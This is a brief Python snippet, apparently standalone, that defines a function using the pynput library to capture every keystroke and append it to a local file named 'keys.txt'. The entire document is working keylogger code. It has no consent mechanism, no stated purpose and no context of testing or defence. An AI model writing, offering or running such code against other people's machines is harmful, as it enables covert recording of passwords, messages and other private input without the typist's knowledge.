from pynput.keyboard import Listener

def keyslog():
    with Listener(on_press=lambda key: open("keys.txt", "a").write(str(key) + "\n")) as listener:
        listener.join()
    return "keys.txt"